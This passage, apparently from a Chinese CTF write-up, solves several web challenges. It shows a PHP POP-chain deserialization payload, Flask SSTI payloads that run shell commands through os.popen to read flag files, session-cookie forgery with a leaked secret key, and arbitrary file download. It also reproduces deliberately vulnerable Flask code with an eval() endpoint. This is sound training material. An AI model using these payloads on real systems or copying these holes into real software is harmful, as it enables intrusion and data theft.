+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uncipher</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$charset</span> = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;<br>    <span class="hljs-variable">$shift</span> = <span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$shifted</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$charset</span>, <span class="hljs-variable">$char</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$new_pos</span> = <span class="hljs-variable">$pos</span> + <span class="hljs-variable">$shift</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>);<br><br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$charset</span>[<span class="hljs-variable">$new_pos</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$char</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$shifted</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">uncipher</span>(<span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>得到 get&#x3D; <code>fe1ka1ele1efp</code></p>
+<p>然后我们根据<code>cycycycy-&gt;aaa()</code>可以反推出一条pop链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">w_wuw_w-&gt;<span class="hljs-title function_ invoke__">destruct</span>()  =&gt;  gBoBg-&gt;<span class="hljs-title function_ invoke__">toString</span>()  =&gt;  w_wuw_w-&gt;<span class="hljs-title function_ invoke__">__invoke</span>()<br>=&gt;  EeE-&gt;<span class="hljs-title function_ invoke__">__clone</span>()  =&gt;  cycycycy-&gt;<span class="hljs-title function_ invoke__">aaa</span>()<br></code></pre></td></tr></table></figure>
+
+<p>于是我们如下构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><span class="hljs-variable">$w</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$g</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$w</span>-&gt;aaa = <span class="hljs-variable">$g</span>;<br><span class="hljs-variable">$g</span>-&gt;file = <span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-variable">$g</span>-&gt;coos = <span class="hljs-variable">$w</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>);<br><br>输出：<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;w_wuw_w&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;aaa&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;gBoBg&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;coos&quot;</span>;r:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后我们传参进行代码执行即可：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081711847.png" srcset="/img/loading.gif" lazyload alt="image-20230408171121787"></p>
+<h4 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h4><p>打开后查看源码，提示<code>app.zip</code>，于是我们下载下来，得到源码：</p>
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>观察一下，<code>render_template_string(&#39;hello %s&#39; % name)</code> 中模板内容可以由参数传入，所以构成了<code>python flask SSTI模板注入</code></p>
+<p>我们观察一下，发现想要注入，</p>
+<p>参数必需包含：<code>ge</code>，如果不包含就不能有<code>f</code></p>
+<p>所以我们就可以去构造我们的payload</p>
+<h5 id="本人解法"><a href="#本人解法" class="headerlink" title="本人解法"></a>本人解法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__[<span class="hljs-string">&#x27;catch_warnings&#x27;</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cd ..;cat flag&quot;).read()&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先我们先通过 <code>&#39;&#39;.__class__</code>获取到：字符串的类型</p>
+<p>然后 <code>__base__</code>获取到字符串的基类(Object，python中对象基类都是Object)</p>
+<p><code>__subclasses__()</code>函数获取到Object类的所有子类，返回一个列表</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032349225.png" srcset="/img/loading.gif" lazyload alt="image-20230403234955145" style="zoom: 33%;" />
+
+<blockquote>
+<p><code>catch_warnings</code>是warnings下的一个模块，当有报错提示时说明导入了此类</p>
+</blockquote>
+<p>由于题目需要我们包含<code>ge</code>，所以我们可以使用 <code>__getitem__[]</code>特殊方法</p>
+<p>获取给定键对应的值</p>
+<p>然后我们再使用<code>__init__</code> 初始化<code>catch_warnings</code>类，</p>
+<p>再使用<code>__globals__</code>，获取全局模块可读的属性、值</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040003579.png" srcset="/img/loading.gif" lazyload alt="image-20230404000356404"></p>
+<p>然后我们使用<code>__builtins__</code>，这个里面可以利用到 eval</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040007847.png" srcset="/img/loading.gif" lazyload alt="image-20230404000751744"></p>
+<p>然后我们使用eval，popen进行命令执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cd ..;cat flag&quot;).read()&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h5 id="官方解法："><a href="#官方解法：" class="headerlink" title="官方解法："></a>官方解法：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/hello/&#123;&#123; <span class="hljs-string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](request.args.get(<span class="hljs-string">&quot;ctfshow&quot;</span>)).read()&#125;&#125;?ctfshow=cat /flag <br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>__subclasses__()[132]</code>获得第132位的类，即：<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，os</p>
+<p>然后 <code>__init__.__globals__[&#39;popen&#39;]</code> 初始化后调用<code>popen</code>，</p>
+<p>但是此处使用 <code>request.args.get(&quot;ctfshow&quot;)</code>，意思是通过get传参传进来命令</p>
+<h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p>注册后看到如下界面，看样子就是要进行身份伪造越权</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040019918.png" srcset="/img/loading.gif" lazyload alt="image-20230404001951846" style="zoom: 33%;" />
+
+<p>我们查看一下部分源码</p>
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response<br><br>app = Flask(__name__)<br><br><br>app.secret_key = <span class="hljs-string">&#x27;S3cr3tK3y&#x27;</span>  <span class="hljs-comment"># 这里是关键点</span><br><br>users = &#123;<br><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><span class="hljs-comment"># Check if user is loggedin</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>msg = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> password == users[username][<span class="hljs-string">&#x27;password&#x27;</span>]:<br>session[<span class="hljs-string">&#x27;loggedin&#x27;</span>] = <span class="hljs-literal">True</span><br>session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>session[<span class="hljs-string">&#x27;role&#x27;</span>] = users[username][<span class="hljs-string">&#x27;role&#x27;</span>]<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>msg = <span class="hljs-string">&#x27;Incorrect username/password!&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, msg=msg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>msg = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>msg = <span class="hljs-string">&#x27;Account already exists!&#x27;</span><br><span class="hljs-keyword">else</span>:<br>users[username] = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;<br>msg = <span class="hljs-string">&#x27;You have successfully registered!&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, msg=msg)<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/profile/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile2.html&#x27;</span>, username=session[<span class="hljs-string">&#x27;username&#x27;</span>], role=session[<span class="hljs-string">&#x27;role&#x27;</span>])<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>........<br></code></pre></td></tr></table></figure>
+
+<p>这里源码中的密钥很可疑，网站使用flask框架</p>
+<p>用bp抓个包</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040022371.png" srcset="/img/loading.gif" lazyload alt="image-20230404002223291" style="zoom: 33%;" />
+
+<p>这里cookie中存在一个session，因此我们断定这是<code>flask session伪造</code></p>
+<p>我们使用工具：<code>flask_session_cookie_manager</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040027945.png" srcset="/img/loading.gif" lazyload alt="image-20230404002709895"></p>
+<p>先解码一下，然后把<code>user</code>换成<code>admin</code>再编码一下</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040028988.png" srcset="/img/loading.gif" lazyload alt="image-20230404002805939"></p>
+<p>得到了伪造后的session，然后我们再发送给服务器：</p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040029129.png" srcset="/img/loading.gif" lazyload alt="image-20230404002936045" style="zoom: 33%;" />
+
+<p>发现一个下载按钮，下载后得到一个假的flag，</p>
+<p>此处存在任意文件下载漏洞，我们下载的时候抓包，将filename改为app.py获取源码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040031891.png" srcset="/img/loading.gif" lazyload alt="image-20230404003125830"></p>
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response<br><br><br>app = Flask(__name__)<br><br><br>app.secret_key = <span class="hljs-string">&#x27;S3cr3tK3y&#x27;</span><br><br>users = &#123;<br>    <span class="hljs-string">&#x27;admin&#x27;</span>: &#123;<span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;<br>&#125;<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># Check if user is loggedin</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> password == users[username][<span class="hljs-string">&#x27;password&#x27;</span>]:<br>            session[<span class="hljs-string">&#x27;loggedin&#x27;</span>] = <span class="hljs-literal">True</span><br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            session[<span class="hljs-string">&#x27;role&#x27;</span>] = users[username][<span class="hljs-string">&#x27;role&#x27;</span>]<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            msg = <span class="hljs-string">&#x27;Incorrect username/password!&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login2.html&#x27;</span>, msg=msg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;</span> <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            msg = <span class="hljs-string">&#x27;Account already exists!&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            users[username] = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;<br>            msg = <span class="hljs-string">&#x27;You have successfully registered!&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register2.html&#x27;</span>, msg=msg)<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/profile/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile2.html&#x27;</span>, username=session[<span class="hljs-string">&#x27;username&#x27;</span>], role=session[<span class="hljs-string">&#x27;role&#x27;</span>])<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/show/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;show2.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;filename&#x27;</span> <span class="hljs-keyword">in</span> request.args:              <br>            <span class="hljs-keyword">return</span> send_file(filename, as_attachment=<span class="hljs-literal">True</span>)<br>  <br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">try</span>:<br>        s = request.args.get(<span class="hljs-string">&#x27;eval&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;hello,<span class="hljs-subst">&#123;<span class="hljs-built_in">eval</span>(s)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">pass</span><br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span><br>    <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>   session.pop(<span class="hljs-string">&#x27;loggedin&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-literal">None</span>)<br>   <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>这里存在代码漏洞，我们直接读根目录：</p>
